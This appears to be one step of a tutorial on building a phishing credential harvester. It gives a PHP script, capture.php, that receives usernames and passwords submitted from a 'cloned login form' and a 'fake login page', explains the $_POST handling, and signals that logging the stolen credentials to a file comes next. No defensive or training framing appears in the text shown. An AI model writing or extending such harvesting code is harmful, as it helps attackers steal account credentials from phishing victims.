Crafting `capture.php`: Basic Structure

Setting Up Your Server-Side Credential Logger

`capture.php` - Initial Structure
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = isset($_POST['username']) ? $_POST['username'] : 'N/A';
    $password = isset($_POST['password']) ? $_POST['password'] : 'N/A';

    // Credentials are now in $username and $password variables
    // Next: Log them to a file

} else {
    echo "This page only processes POST requests.";
}
?>

`$_SERVER['REQUEST_METHOD']`

This superglobal variable holds the request method used to access the page (e.g., 'GET', 'POST'). We check for 'POST' to ensure we're handling form submissions.

`$_POST` Superglobal

An associative array of variables passed to the current script via the HTTP POST method. It's how we access the data submitted from the HTML form's input fields, using their `name` attributes as keys.

Concrete Example

If your cloned login form has <input type="text" name="user_id">, you would access the submitted value in PHP using $_POST['user_id']. It's crucial that the `name` attribute matches.

Key Takeaway

The initial `capture.php` script validates the request method and extracts submitted data using `$_POST`. This forms the essential backend for receiving credentials from your fake login page.
